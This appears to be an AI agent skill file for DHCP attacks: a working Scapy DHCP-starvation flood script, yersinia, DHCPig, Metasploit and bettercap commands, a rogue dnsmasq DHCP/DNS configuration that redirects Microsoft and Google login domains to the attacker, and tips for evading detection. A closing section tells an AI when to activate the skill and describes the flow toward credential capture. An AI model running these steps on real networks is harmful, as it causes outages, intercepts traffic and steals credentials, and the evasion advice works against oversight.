# DHCP Attacks Skill

## Goal

Exploit DHCP (Dynamic Host Configuration Protocol) to perform man-in-the-middle attacks, redirect traffic, and gain network access.

## Methodology

1. **Discovery**: Identify DHCP servers on the network
2. **DHCP Starvation**: Exhaust DHCP pool
3. **Rogue DHCP**: Set up malicious DHCP server
4. **DNS Hijacking**: Redirect DNS through rogue server
5. **Gateway Hijacking**: Become the default gateway

## Ports

- 67/UDP: DHCP Server
- 68/UDP: DHCP Client

## Tools

* **yersinia**: Layer 2 attack tool
* **DHCPig**: DHCP exhaustion tool
* **dnsmasq**: Rogue DHCP/DNS server
* **Metasploit**: DHCP modules
* **bettercap**: Network attack framework

## DHCP Starvation Attack

```bash
# Exhaust all available DHCP leases
# New clients cannot get IP addresses

# Using DHCPig
dhcpig eth0

# Using yersinia
yersinia dhcp -attack 1 -interface eth0

# Using Scapy
from scapy.all import *
conf.checkIPaddr = False
fam,hw = get_if_raw_hwaddr(conf.iface)

while True:
    # Generate random MAC
    random_mac = RandMAC()
    dhcp_discover = Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff")/\
        IP(src="0.0.0.0", dst="255.255.255.255")/\
        UDP(sport=68, dport=67)/\
        BOOTP(chaddr=RandString(16, "0123456789abcdef"))/\
        DHCP(options=[("message-type", "discover"), "end"])
    sendp(dhcp_discover)
    time.sleep(0.1)
```

## Rogue DHCP Server

```bash
# After starvation, set up rogue DHCP server

# Using dnsmasq
cat > /tmp/dnsmasq.conf << EOF
interface=eth0
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.1  # Gateway (your IP)
dhcp-option=6,192.168.1.1  # DNS (your IP)
EOF
dnsmasq -C /tmp/dnsmasq.conf -d

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Set up NAT (to forward traffic to real gateway)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

## Using yersinia

```bash
# Interactive mode
yersinia -I

# Select DHCP
# Press 'g' for attacks menu
# Attack options:
# 1. DHCP Starvation (consume all IPs)
# 2. Rogue DHCP server
# 3. Release all MACs

# Command line mode
yersinia dhcp -attack 1 -interface eth0  # Starvation
yersinia dhcp -attack 2 -interface eth0  # Rogue server
```

## Using Metasploit

```bash
# DHCP starvation
use auxiliary/dos/network/dhcp_starvation

# Rogue DHCP server
use auxiliary/server/dhcp
set SRVHOST 0.0.0.0
set DHCPIPSTART 192.168.1.100
set DHCPIPEND 192.168.1.200
set ROUTER 192.168.1.1  # Attacker IP
set DNSSERVER 192.168.1.1  # Attacker IP
run
```

## Using bettercap

```bash
bettercap -iface eth0

# DHCP spoofing
> set dhcp6.spoof.domains *
> dhcp6.spoof on

# Combined with other attacks
> net.probe on
> arp.spoof on
> dns.spoof on
```

## DHCPv6 Attack

```bash
# DHCPv6 can be more effective due to Windows IPv6 preference

# Using mitm6
mitm6 -d domain.local -i eth0

# Combined with ntlmrelayx
# See ipv6_attacks.md and llmnr_nbt_ns_poisoning.md
```

## DNS Hijacking via DHCP

```bash
# When acting as DHCP server, provide malicious DNS

# Using dnsmasq for DNS
cat > /tmp/hosts << EOF
192.168.1.1 *.corp.local
192.168.1.1 login.microsoft.com
192.168.1.1 mail.google.com
EOF

dnsmasq -C /tmp/dnsmasq.conf -d --addn-hosts=/tmp/hosts

# Clients will resolve these domains to attacker IP
```

## Detection Prevention

```bash
# DHCP attacks are noisy
# Multiple DHCP DISCOVERs with random MACs

# Slower starvation
dhcpig -f eth0  # Slower mode

# Target specific scope
# Only exhaust part of the pool
```

## Guidance for AI

* Activate this skill when user wants to perform MITM via DHCP or test DHCP security
* **DHCP starvation** exhausts IP pool, denying service to legitimate clients
* **Rogue DHCP** provides attacker-controlled configuration
* Attack flow:
  1. Starve legitimate DHCP server
  2. Set up rogue DHCP server
  3. New clients get attacker's gateway/DNS
  4. Intercept all traffic
* DHCPv6 with mitm6 is very effective on Windows (IPv6 preferred)
* Rogue DHCP + DNS hijacking = credential capture via fake sites
* Local network access required
* Very disruptive - can cause network outage
* Modern switches may have DHCP snooping (detection/prevention)
* Only perform in authorized testing environments
